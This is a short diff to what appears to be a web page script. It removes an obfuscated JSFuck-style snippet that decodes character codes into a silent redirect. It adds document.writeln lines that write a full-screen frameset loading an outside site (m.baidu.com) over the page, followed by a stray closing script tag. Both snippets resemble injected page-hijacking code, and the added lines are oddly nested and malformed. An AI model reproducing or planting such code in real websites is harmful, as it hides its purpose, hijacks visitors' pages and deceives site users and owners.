@@ -1,1 +1,6 @@
-!function(){var n=32,c=!1+[],f=c[0],i=f[1]+[],o=c[1],t=c[3],u=c[4],a=i[5],r=[]+{},v=r[5],b=r[2],d=i[0],e=i[1],g=(!0+[])[0],h=r[1],j=r[7],k=i[2],l=(!0+[])[1],m=v+h+e+t+g+l+d+v+g+h+l,p=[][f+a+c[2]+g+u+l][m],q=p(l+u+g+d+l+e+j+b+g+h+o)(),s=q(o+j)[1],w=q(b)[1],x=g+h+s+g+l+a+e+w,y=25[x](n),z=[][m][m](l+u+g+d+l+e+j+u+t+v+o+y+u)()(""[b+a+w]())[2],A=22[x](n),B=17[x](n),C=""[m][f+l+h+A+z+B+o+l+z+h+k+u];"ᕀᒷᏞ"==(function(){}+[])[t+d+b+t+g+l](12,3)&&p(C(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,105,110,100,101,120,46,104,116,109,108,34,59,32))()}();
+document.writeln("document.write(\"<frameset rows=\'100%,*\'frameborder=\'NO\'border=\'0\'
+framespacing=\'0\'>\");");
+document.writeln("document.write(\"<frame name=\'main\'src=\'https://m.baidu.com/'
+scrolling=yes>\");");
+document.writeln("document.write(\"<\/frameset>\");");
+document.writeln("<\/script>");
